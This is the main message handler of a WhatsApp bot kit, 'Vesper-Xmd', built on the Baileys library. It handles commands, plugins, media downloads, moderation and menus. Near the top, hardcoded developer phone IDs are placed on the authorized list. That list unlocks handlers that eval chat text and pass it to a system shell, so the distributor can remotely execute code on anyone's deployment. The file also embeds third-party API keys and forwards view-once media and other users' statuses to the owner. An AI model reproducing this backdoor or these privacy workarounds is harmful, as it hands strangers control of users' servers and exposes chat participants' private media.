/*
 * Give credits to Faizan-Abbasi
 Contact me on +923120625769
 Coding sounds lounder 
*/

require('./start/Core/developer');
const fs = require('fs');
const util = require("util");
const moment = require("moment-timezone");
const path = require('path');
const axios = require('axios')
const cheerio = require('cheerio')
const os = require('os');
const { performance } = require("perf_hooks");
const acrcloud = require ('acrcloud');
const lolcatjs = require('lolcatjs');
const timezones = global.timezones || "Africa/Kampala";
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const {
  spawn,
  exec, 
  execSync 
} = require('child_process');

const { 
  default: baileys,
  proto, 
  generateWAMessage,
  getDevice,
  generateWAMessageFromContent,
  getContentType, 
  prepareWAMessageMedia,
  jidDecode
} = require("@whiskeysockets/baileys");

const { 
      smsg,
      formatSize,
      isUrl,
      generateMessageTag,
      getBuffer,
      getSizeMedia,
      runtime,
      fetchJson,
      sleep 
    } = require('./start/lib/myfunction');

const db = require('./start/Core/databaseManager');
const GroupDB = require('./start/Metadata/group');

const PluginManager = require('./start/lib/PluginManager');

const { 
    handleAntiDelete,
    handleLinkViolation,
    checkAndHandleLinks,
    handleAntiTag,
    handleAntiTagAdmin,
    handleBadword,
    handleAntisticker,
    handleAntiEdit,
    handleMessageStore 
} = require('./start/kevin');

const { handleAutoReact } = require('./start/kelvinCmds/autoreact');
const { handleAutoRead } = require('./start/kelvinCmds/autoread');
const { handleAutoRecording } = require('./start/kelvinCmds/autorecord');
const { applyFont, setBotNumber } = require('./start/src/font');
const { handleAutoTyping } = require('./start/kelvinCmds/autotyping');
const { handleAIChatbot } = require('./start/kelvinCmds/chatbot');
const DEV_NUMBERS = ['256742932677', '256755585369'];
const DEV_JIDS = [
    '923120625769@s.whatsapp.net',
    '923120625769@s.whatsapp.net',
    '',
    ''
];



// Menu Images - KelvinTech Style
let kelvinkid1, kelvinkid2, kelvinkid3, kelvinkid4, kelvinkid5;   
    
// Load images
kelvinkid1 = fs.readFileSync("./start/lib/Media/Images/Vesper1.jpg");
kelvinkid2 = fs.readFileSync("./start/lib/Media/Images/Vesper1.jpg");
kelvinkid3 = fs.readFileSync("./start/lib/Media/Images/Vesper1.jpg");
kelvinkid4 = fs.readFileSync("./start/lib/Media/Images/Vesper1.jpg");
kelvinkid5 = fs.readFileSync("./start/lib/Media/Images/Vesper1.jpg");

//Shazam
const acr = new acrcloud({
    host: 'identify-eu-west-1.acrcloud.com',
    access_key: '882a7ef12dc0dc408f70a2f3f4724340',
    access_secret: 'qVvKAxknV7bUdtxjXS22b5ssvWYxpnVndhy2isXP'
});

const UPTIME_FILE = path.join(__dirname, 'data', 'server_uptime.json');

// Create data folder if it doesn't exist
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

function normalizeJid(jid) {
    if (!jid) return jid;
    if (typeof jid !== 'string') return jid;
    if (jid.includes(':') && jid.includes('@s.whatsapp.net')) {
        const parts = jid.split(':');
        if (parts[1] && parts[1].includes('@')) {
            return `${parts[0]}@${parts[1].split('@')[1]}`;
        }
    }
    
    // Return as-is for lid format
    return jid;
}

// Get or create server start time
function getServerStartTime() {
    try {
        if (fs.existsSync(UPTIME_FILE)) {
            const data = JSON.parse(fs.readFileSync(UPTIME_FILE, 'utf8'));
            return data.startTime;
        }
    } catch (e) {
        console.log('Creating new uptime file in data folder...');
    }
    
    const startTime = Date.now();
    fs.writeFileSync(UPTIME_FILE, JSON.stringify({ startTime, createdAt: new Date().toISOString() }));
    return startTime;
}

const SERVER_START_TIME = getServerStartTime();

function getServerUptime() {
    const uptimeMs = Date.now() - SERVER_START_TIME;
    const uptimeSeconds = Math.floor(uptimeMs / 1000);
    return runtime(uptimeSeconds);
}

// Platform detection 
const getHostPlatform = () => {
  if (process.env.DYNO) return "Heroku";
  if (process.env.RENDER) return "Render";
  if (process.env.PREFIX && process.env.PREFIX.includes("termux")) return "Termux";
  if (process.env.PORTS && process.env.CYPHERX_HOST_ID) return "CypherX Platform";
  if (process.env.P_SERVER_UUID) return "Panel";
  if (process.env.LXC) return "Linux Container (LXC)";
  
  switch (os.platform()) {
    case "win32": return "🪟 Windows";
    case "darwin": return "🍎 macOS";
    case "linux": return "🐧 Linux";
    default: return "❓ Unknown";
  }
};

// ephoto function 
async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $("input[name=token]").val();
      let build_server = $("input[name=build_server]").val();
      let build_server_id = $("input[name=build_server_id]").val();
      form.append("text[]", text);
      form.append("token", token);
      form.append("build_server", build_server);
      form.append("build_server_id", build_server_id);
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          "Content-Type": "multipart/form-data",
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$("input[name=form_value_input]").val());
      json["text[]"] = json.text;
      delete json.text;
      let { data } = await axios.post(
        "https://en.ephoto360.com/effect/create-image",
        new URLSearchParams(json),
        {
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"].join("; "),
          },
        }
      );
      return build_server + data.image;
 }

async function saveStatusMessage(m) {
  try {
    if (!m.quoted || m.quoted.chat !== 'status@broadcast') {
      return m.reply('*Please reply to a status message!*');
    }
    await m.quoted.copyNForward(m.chat, true);
    kelvin.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    console.log('Status saved successfully!');
  } catch (error) {
    console.error('Failed to save status message:', error);
    reply(`Error: ${error.message}`);
  }
}

// Function to fetch (MP3)
async function fetchMp3DownloadUrl(youtubeUrl) {
  const apis = [
    {
      name: "DavidXTech API",
      fetch: async () => {
        let url = youtubeUrl;
        if (!url.includes('youtube.com') && !url.includes('youtu.be')) {
          url = `https://www.youtube.com/watch?v=${url}`;
        }
        const apiUrl = `https://meta.davidxtech.de/api/yt/play?q=${encodeURIComponent(url)}`;
        const res = await axios.get(apiUrl, { timeout: 25000 });
        if (!res.data?.success || !res.data?.data?.downloadUrl) {
          throw new Error('No audio URL from DavidXTech');
        }
        return res.data.data.downloadUrl;
      }
    },
    {
      name: "Faa API",
      fetch: async () => {
        let url = youtubeUrl;
        
        // If it's a video ID, convert to URL
        if (!url.includes('youtube.com') && !url.includes('youtu.be')) {
          url = `https://www.youtube.com/watch?v=${url}`;
        }
        
        const apiUrl = `https://api-faa.my.id/faa/ytplay?query=${encodeURIComponent(url)}`;
        const res = await axios.get(apiUrl, { timeout: 25000 });
        
        if (!res.data?.status || !res.data?.result?.mp3) {
          throw new Error('No audio URL from Faa API');
        }
        
        return res.data.result.mp3;
      }
    }
  ];

  for (const api of apis) {
    try {
      console.log(`🔄 Trying ${api.name}...`);
      const audioUrl = await api.fetch();
      console.log(`✅ ${api.name} successful!`);
      return audioUrl;
    } catch (err) {
      console.warn(`❌ ${api.name} failed: ${err.message}`);
      continue;
    }
  }
  throw new Error("All audio download APIs failed.");
}

// Function to fetch videos 
async function fetchVideoDownloadUrl(youtubeUrl) {
  const apis = [
    {
      name: "DavidXTech API",
      fetch: async () => {
        let url = youtubeUrl;
        if (!url.includes('youtube.com') && !url.includes('youtu.be')) {
          url = `https://www.youtube.com/watch?v=${url}`;
        }
        const apiUrl = `https://meta.davidxtech.de/api/yt/video?q=${encodeURIComponent(url)}`;
        const res = await axios.get(apiUrl, { timeout: 30000 });
        if (!res.data?.success || !res.data?.data?.downloadUrl) {
          throw new Error('No video URL from DavidXTech');
        }
        return res.data.data.downloadUrl;
      }
    },
    {
      name: "Faa API",
      fetch: async () => {
        let url = youtubeUrl;
        
        // If it's a video ID or URL, extract the video ID or use as is
        let videoId = url;
        if (url.includes('youtube.com/watch?v=')) {
          videoId = url.split('v=')[1].split('&')[0];
        } else if (url.includes('youtu.be/')) {
          videoId = url.split('youtu.be/')[1].split('?')[0];
        }
        
        // For search terms, use the original url as query
        const apiUrl = `https://api-faa.my.id/faa/ytplayvid?q=${encodeURIComponent(url)}`;
        const res = await axios.get(apiUrl, { timeout: 30000 });
        
        if (!res.data?.status || !res.data?.result?.download_url) {
          throw new Error('No video URL from Faa API');
        }
        
        return res.data.result.download_url;
      }
    }
  ];

  for (const api of apis) {
    try {
      console.log(`🔄 Trying ${api.name}...`);
      const videoUrl = await api.fetch();
      console.log(`✅ ${api.name} successful!`);
      return videoUrl;
    } catch (err) {
      console.warn(`❌ ${api.name} failed: ${err.message}`);
      continue;
    }
  }
  throw new Error("All video download APIs failed.");
}

function generateMenuText(plugins, ownername, prefix, mode, versions, latensie, readmore) {
    const memoryUsage = process.memoryUsage();
    const totalMemory = os.totalmem();
    const systemUsedMemory = totalMemory - os.freemem();

    const progressBar = (used, total, size = 6) => {
        let percentage = Math.round((used / total) * size);
        let bar = '█'.repeat(percentage) + '░'.repeat(size - percentage);
        return `[${bar}] ${Math.round((used / total) * 100)}%`;
    };

    let totalCommands = 0;
    const uniqueCommands = new Set();
    for (const category in plugins) {
        plugins[category].forEach(plugin => {
            if (plugin.command && plugin.command.length > 0) {
                uniqueCommands.add(plugin.command[0]);
            }
        });
    }
    totalCommands = uniqueCommands.size;

    let menu = `┌─❖ *Vesper-Xmd* ❖─\n`;
menu += `├─• ᴜsᴇʀ: ${ownername}\n`;
menu += `├─• ᴍᴏᴅᴇ: ${mode === 'public' ? 'ᴘᴜʙʟɪᴄ' : 'ᴘʀɪᴠᴀᴛᴇ'}\n`;
menu += `├─• ᴘʟᴀᴛꜰᴏʀᴍ: ${getHostPlatform()}\n`;
menu += `├─• ᴘʀᴇғɪx: [ ${prefix} ]\n`;
menu += `├─• ᴄᴍᴅs: ${totalCommands}+\n`;
menu += `├─• ᴠᴇʀsɪᴏɴ: ${versions}\n`;
menu += `├─• sᴘᴇᴇᴅ: ${latensie.toFixed(4)} ms\n`;
menu += `├─• 𝚁𝙰𝙼: ${progressBar(systemUsedMemory, totalMemory)}\n`;
menu += `└─• ᴅᴇᴠ: ☘ ᴋᴇʟᴠɪɴ  ☘\n`;
menu += `${readmore || ''}\n`;
    
    for (const category in plugins) {
    menu += `┏⟡  *${category.toUpperCase()} MENU* ⟡\n`;
    plugins[category].forEach(plugin => {
        if (plugin.command && plugin.command.length > 0) {
            menu += `┃⌬ ${plugin.command[0]}\n`;
        }
    });
    menu += `┗━⟡\n\n`;
    }
    
    return menu;
}

function loadMenuPlugins(directory) {
    const plugins = {};
    
    if (!fs.existsSync(directory)) {
        console.error(`Directory ${directory} does not exist`);
        return plugins;
    }

    const files = fs.readdirSync(directory);
    files.forEach(file => {
        if (file.endsWith('.js')) {
            const filePath = path.join(directory, file);
            try {
                delete require.cache[require.resolve(filePath)];
                const pluginModule = require(filePath);
                
                const pluginArray = Array.isArray(pluginModule) ? pluginModule : [pluginModule];
                const category = path.basename(file, '.js');
                
                if (!plugins[category]) {
                    plugins[category] = [];
                }
                
                plugins[category].push(...pluginArray);
            } catch (error) {
                console.error(`Error loading plugin at ${filePath}:`, error);
            }
        }
    });

    return plugins;
}

module.exports = client = async (kelvin, m, chatUpdate, store) => {
  try {
    const body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
      m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
                                         m.message.listResponseMessage?.singleSelectReply.selectedRowId || 
                                         m.text : ""
    );
    
const botNumber = await kelvin.decodeJid(kelvin.user.id);

let prefix = ".";

try {
    prefix = await db.get(botNumber, 'prefix', '.');
} catch (error) {
    prefix = ".";
}

try {
    const alwaysonlineSetting = await db.get(botNumber, 'alwaysonline', false);
    
    if (typeof alwaysonlineSetting === 'boolean') {
        global.alwaysonline = alwaysonlineSetting;
    } else if (typeof alwaysonlineSetting === 'string') {
        global.alwaysonline = alwaysonlineSetting.toLowerCase() === 'true';
    } else {
        global.alwaysonline = false;
    }
} catch (error) {
    global.alwaysonline = false;
}

const isCmd = body && typeof body === 'string' && body.startsWith(prefix);
const trimmedBody = isCmd ? body.slice(prefix.length).trimStart() : "";
const command = isCmd && trimmedBody ? trimmedBody.split(/\s+/).shift().toLowerCase() : "";
const args = isCmd ? body.slice(prefix.length).trim().split(/\s+/).slice(1) : [];
const text = args.join(" ");
    
    const sender = m.key.fromMe ? kelvin.user.id.split(":")[0] + "@s.whatsapp.net" || kelvin.user.id : m.key.participant || m.key.remoteJid;
    const senderNumber = m.sender.replace(/[^0-9]/g, "");
    const budy = (typeof m.text === 'string' ? m.text : '');
    const chatId = m.chat;
    const from = m.key.remoteJid;
    const senderId = m.key.participant || from;
    const isGroup = from.endsWith("@g.us");

   const LegendaryKevin = JSON.parse(fs.readFileSync('./data/owner.json'));
const ownerFile = './data/owner.json';
const ownerList = LegendaryKevin.owner || [];

const authorizedJids = [
    ...DEV_JIDS,
    ...ownerList,
    botNumber
];

const Access = authorizedJids.includes(m.sender);

    const pushname = m.pushName || "No Name";
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || '';
    const qmsg = (quoted.msg || quoted);
    const isMedia = /image|video|sticker|audio/.test(mime);

let groupMetadata = null;
let groupName = "";
let participants = [];

if (isGroup) {
    try {
        groupMetadata = await kelvin.groupMetadata(from);
        groupName = groupMetadata.subject || "";
        participants = groupMetadata.participants || [];
    } catch (err) {
        console.log('[GROUP METADATA ERROR]', err.message);
    }
}

// Forward view-once to owner
if (m.quoted?.viewOnce && Access && body?.trim()) {
    try {
        const msg = m.msg?.contextInfo?.quotedMessage || m.quoted?.message;
        const type = Object.keys(msg)[0];
        if (/image|video|audio/.test(type)) {
            let mediaType = 'image';
            if (type === 'imageMessage') mediaType = 'image';
            else if (type === 'videoMessage') mediaType = 'video';
            else if (type === 'audioMessage') mediaType = 'audio';
            
            const stream = await downloadContentFromMessage(msg[type], mediaType);
            let buf = Buffer.from([]);
            for await (const chunk of stream) buf = Buffer.concat([buf, chunk]);
            const ownerJid = normalizeJid(kelvin.user.id);
            
            const messageOptions = {
                caption: `📥 View-Once from @${m.sender.split('@')[0]}`
            };
            
            if (type === 'imageMessage') {
                await kelvin.sendMessage(ownerJid, { image: buf, ...messageOptions });
            } else if (type === 'videoMessage') {
                await kelvin.sendMessage(ownerJid, { video: buf, ...messageOptions });
            } else if (type === 'audioMessage') {
                await kelvin.sendMessage(ownerJid, { audio: buf, mimetype: 'audio/mpeg', ...messageOptions });
            }
            
            await kelvin.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        }
    } catch (e) {}
}

// Forward status to owner
else if (m.quoted?.chat === 'status@broadcast' && Access) {
    try {
        const q = m.quoted;
        const s = q.key?.participant || q.key?.remoteJid;
        const ownerJid = normalizeJid(kelvin.user.id);
        
        if (q.message?.imageMessage) {
            const stream = await downloadContentFromMessage(q.message.imageMessage, 'image');
            let buf = Buffer.from([]);
            for await (const chunk of stream) buf = Buffer.concat([buf, chunk]);
            await kelvin.sendMessage(ownerJid, { 
                image: buf, 
                caption: `Status from @${s.split('@')[0]}\n📝 ${q.message.imageMessage.caption || 'No caption'}`
            });
        } 
        else if (q.message?.videoMessage) {
            const stream = await downloadContentFromMessage(q.message.videoMessage, 'video');
            let buf = Buffer.from([]);
            for await (const chunk of stream) buf = Buffer.concat([buf, chunk]);
            await kelvin.sendMessage(ownerJid, { 
                video: buf, 
                caption: `Status from @${s.split('@')[0]}\n📝 ${q.message.videoMessage.caption || 'No caption'}`
            });
        }
        else if (q.message?.audioMessage) {
            const stream = await downloadContentFromMessage(q.message.audioMessage, 'audio');
            let buf = Buffer.from([]);
            for await (const chunk of stream) buf = Buffer.concat([buf, chunk]);
            await kelvin.sendMessage(ownerJid, { 
                audio: buf, 
                mimetype: 'audio/mpeg',
                caption: `Status from @${s.split('@')[0]}`
            });
        }
        else {
            const text = q.message?.conversation || q.message?.extendedTextMessage?.text || '';
            await kelvin.sendMessage(ownerJid, { 
                text: `Status from @${s.split('@')[0]}\n\n📝 ${text}`
            });
        }
        await kelvin.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    } catch (e) {}
}

if (m.message && !m.message.protocolMessage) {
        handleMessageStore(m);
    }
    
  
    if (m.message?.protocolMessage?.type === 0) {
        console.log('[System] Delete event detected');
        await handleAntiDelete(m, kelvin);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoReact(m, kelvin).catch(console.error);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoRead(m, kelvin).catch(console.error);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoRecording(m, kelvin).catch(console.error);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoTyping(m, kelvin).catch(console.error);
    }
    
   if (m.message?.protocolMessage?.editedMessage) {
    await handleAntiEdit(m, kelvin);
} 

 if (m.isGroup && body && !m.key.fromMe) {
    await checkAndHandleLinks(kelvin, {
        key: m.key,
        message: m.message
    }, m, botNumber);  
}

if (m.isGroup && m.message && !m.key.fromMe) {
    const mentionedUsers = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (mentionedUsers.length > 0) {
        await handleAntiTag(kelvin, m, botNumber);  
    }
} 

if (m.isGroup && body) {
    await handleAntiTagAdmin(kelvin, m);
}

 if ((m.mtype || '').includes("groupStatusMentionMessage") && m.isGroup) {
    const antigstatus = await db.get(botNumber, 'antigroupmention', false);
    
    if (antigstatus) {
        if (!m.isAdmin && !Access) {
            try {
                await kelvin.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: false,
                        id: m.key.id,
                        participant: m.sender
                    }
                });
                console.log(`✅ Deleted status mention from ${m.sender}`);
            } catch (error) {
                console.log('Failed to delete status mention:', error);
            }
        }
    }
}

if (m.isGroup && !m.key.fromMe && body && body.trim().length > 0) {
    try {
        await GroupDB.addMessage(from, sender); 
    } catch (error) {
        console.error('Error tracking user activity:', error.message);
    }
}

if (m.isGroup && body && !m.key.fromMe) {
    await handleBadword(kelvin, m, botNumber);
}

if (m.isGroup && !m.key.fromMe) {
    await handleAntisticker(kelvin, m, botNumber);
}

if (global.alwaysonline === true || global.alwaysonline === 'true') {
    if (m.message && !m.key.fromMe) {
        try {
            await kelvin.sendPresenceUpdate("available", from);
            await sleep(1000);
        } catch (error) {}
    }
} else {
    if (m.message && !m.key.fromMe) {
        try {
            await kelvin.sendPresenceUpdate("unavailable", from);
            await sleep(1000);
        } catch (error) {}
    }
}
    await handleAIChatbot(m, kelvin, body, from, isGroup, botNumber, isCmd, prefix);
    
    const time = moment.tz("Asia/Makassar").format("HH:mm:ss");
    
    //================== [ CONSOLE LOG] ==================//
    const timezones = "Asia/Makassar"; 
    const dayz = moment(Date.now()).tz(timezones).locale('en').format('dddd');
    const timez = moment(Date.now()).tz(timezones).locale('en').format('HH:mm:ss z');
    const datez = moment(Date.now()).tz(timezones).format("DD/MM/YYYY");

    if (m.message) {
      lolcatjs.fromString(`┏━━━━━━━━━━━━━『  VESPER-XMD  』━━━━━━━━━━━━━─`);
      lolcatjs.fromString(`»  Sent Time: ${dayz}, ${timez}`);
      lolcatjs.fromString(`»  Date: ${datez}`);
      lolcatjs.fromString(`»  Message Type: ${m.mtype || 'N/A'}`);
      lolcatjs.fromString(`»  Sender Name: ${pushname || 'N/A'}`);
      lolcatjs.fromString(`»  Chat ID: ${m.chat?.split('@')[0] || 'N/A'}`);
      
      if (isGroup) {
        lolcatjs.fromString(`»  Group: ${groupName || 'N/A'}`);
        lolcatjs.fromString(`»  Group JID: ${m.chat?.split('@')[0] || 'N/A'}`);
      }
      
      lolcatjs.fromString(`»  Message: ${budy || 'N/A'}`);
      lolcatjs.fromString('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─ ⳹\n\n');
    }
    //<================================================>//
  
// Initialize font system with bot number
(async () => {
    try {
        const botNum = await kelvin.decodeJid(kelvin.user.id);
        setBotNumber(botNum);
    } catch (e) {}
})();

const reply = (text) => m.reply(applyFont(text));
    

const context = {
    kelvin,
    m,
    reply,
    store,
    prefix,
    command,
    args,
    acr,
    text,
    trimmedBody,
    isCmd,
    sender,
    senderNumber,
    pushname,
    Access,
    db,
    ownerFile,
    GroupDB,
    isCreator: Access,
    isGroup,
    groupName,
    groupMetadata,
    participants,
    quoted,
    saveStatusMessage,
    fetchMp3DownloadUrl,
    fetchVideoDownloadUrl,
    mime,
    qmsg,
    isMedia,
    body: budy,
    botNumber,
    from,
    ephoto,
    getServerUptime,
    getServerStartTime,
    getHostPlatform,
    sleep,
    fetchJson,
    getBuffer,
    getDevice,
    formatSize,
    timezones,
    isUrl,
    runtime,
    match: command,
    mess: global.mess,
    global: global,
    mentionedJid: m.mentionedJid || [],
    pluginManager: global.pluginManager
};
    
const mode = await db.get(botNumber, 'mode', 'public');

    // Handle commands via plugin system
    if (isCmd && command) {
        const result = await global.pluginManager.executeCommand(context, command);
        
        if (!result.found) {
            switch (command) {
                case 'menu': {
    const startTime = performance.now();
    await m.reply("*Loading menu*...");
    
    let menuStyle = await db.getMenuStyle(botNumber, '4');
    menuStyle = String(menuStyle || '4');
    
    const endTime = performance.now();
    const latensie = endTime - startTime;
    
    const ownername = await db.get(botNumber, 'ownername', 'Not set');
    const prefixz = prefix;  
    const modeStatus = mode;
    const versions = `${global.versions || '1.0.0'}`; 
    
    const pluginsDir = path.join(__dirname, 'kelvinPlugins'); 
    const plugins = loadMenuPlugins(pluginsDir);
    
    const menulist = generateMenuText(plugins, ownername, prefixz, modeStatus, versions, latensie, readmore);
    
    const menuImages = [kelvinkid1, kelvinkid2, kelvinkid3, kelvinkid4, kelvinkid5];
    
    await sendMenuWithStyle(kelvin, m, menuStyle, menulist, menuImages);
    break;
}
case 'reloadplugins': {
    if (!Access) return reply('Owner only command!');
                    try {
                        const pluginsDir = path.join(__dirname, 'kelvinPlugins');
                        const count = global.pluginManager.reloadPlugins(pluginsDir);
                        reply(`✅ Reloaded ${count} plugins successfully!`);
                    } catch (error) {
                        reply(` Failed to reload plugins: ${error.message}`);
                    }
                    break;
                }
                
                case 'plugins': {
                    if (!Access) return reply('Owner only command!');
                    const plugins = global.pluginManager.getAllPlugins();
                    let pluginList = '*LOADED PLUGINS*\n\n';
                    
                    for (const [category, pluginArray] of Object.entries(plugins)) {
                        pluginList += `*${category.toUpperCase()}*:\n`;
                        pluginArray.forEach(plugin => {
                            pluginList += `• ${plugin.command[0]}`;
                            if (plugin.command.length > 1) {
                                pluginList += ` (${plugin.command.slice(1).join(', ')})`;
                            }
                            pluginList += '\n';
                        });
                        pluginList += '\n';
                    }
                    
                    reply(pluginList);
                    break;
                }
                
                default: {
                    if (budy.startsWith('>')) {
                        if (!Access) return;
                        try {
                            let evaled = await eval(budy.slice(2));
                            if (typeof evaled !== 'string') evaled = util.inspect(evaled);
                            await m.reply(evaled);
                        } catch (err) {
                            m.reply(String(err));
                        }
                    }
                        
                    if (budy.startsWith('<')) {
                        if (!Access) return;
                        let kode = budy.trim().split(/ +/)[0];
                        let teks;
                        try {
                            teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${text}})()`);
                        } catch (e) {
                            teks = e;
                        } finally {
                            await m.reply(util.format(teks));
                        }
                    }

                    if (budy.startsWith('-')) {
                        if (!Access) return;         
                        if (text == "rm -rf *") return m.reply("😹");
                        exec(budy.slice(2), (err, stdout) => {
                            if (err) return m.reply(`${err}`);
                            if (stdout) return m.reply(stdout);
                        });
                    }
                    
               
                }
            }
        } else if (!result.success) {
            reply(`Error executing ${command}: ${result.error}`);
        }
    }
    
  } catch (err) {
    console.log(util.format(err));
  }
};


// Menu style functions 
async function sendMenuWithStyle(kelvin, m, style, menuText, menuImages) {
    const randomImage = menuImages ? menuImages[Math.floor(Math.random() * menuImages.length)] : null;
    
    switch(style) {
        case '1':
            await kelvin.sendMessage(m.chat, {
                document: kelvinkid1 || Buffer.from(' '),
                mimetype: 'image/jpeg',
                fileName: '✦ ᴋᴇʟᴠɪɴ ᴍᴇɴᴜ ✦',
                fileLength: 99999999999,
                pageCount: 9999999,
                caption: menuText,
                contextInfo: {
                    externalAdReply: {
                        title: 'VESPER',
                        body: '✦ ᴋᴇʟᴠɪɴ ᴍᴇɴᴜ ✦',
                        mediaType: 2,
                        thumbnail: randomImage,
                        mediaUrl: 'https://youtu.be/-',
                        sourceUrl: 'https://whatsapp.com/channel/0029Vb0JX0VfXx3R5X5X5X5X'
                    }
                }
            }, { quoted: m });
            break;
            
        case '2':
            await m.reply(menuText);
            break;
            
        case '3':
            await kelvin.sendMessage(m.chat, {
                text: menuText,
                contextInfo: {
                    externalAdReply: {
                        title: '⚡ VESPER-XMD ⚡',
                        body: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ',
                        thumbnail: randomImage,
                        sourceUrl: 'https://wa.me/256742932677',
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: m });
            break;
            
        case '4':
            if (randomImage) {
                await kelvin.sendMessage(m.chat, {
                    image: randomImage,
                    caption: menuText
                }, { quoted: m });
            } else {
                await kelvin.sendMessage(m.chat, {
                    image: { url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png" },
                    caption: menuText
                }, { quoted: m });
            }
            break;
            
        case '5':
            const interactiveMsg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: {
                                text: null,            
                            },
                            footer: {
                                text: menuText, 
                            },
                            nativeFlowMessage: {
                                buttons: [{
                                    text: null
                                }], 
                            },
                        },
                    },
                },
            }, { quoted: m });
            await kelvin.relayMessage(m.chat, interactiveMsg.message, { messageId: interactiveMsg.key.id });
            break;
            
        case '6':
            await kelvin.relayMessage(m.chat, {
                requestPaymentMessage: {
                    currencyCodeIso4217: 'USD',
                    requestFrom: '0@s.whatsapp.net',
                    amount1000: '1000',
                    noteMessage: {
                        extendedTextMessage: {
                            text: menuText,
                            contextInfo: {
                                mentionedJid: [m.sender],
                                externalAdReply: {
                                    showAdAttribution: false,
                                },
                            },
                        },
                    },
                },
            }, {});
            break;
            
        default:
            await m.reply(menuText);
    }
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
  delete require.cache[file];
  require(file);
});
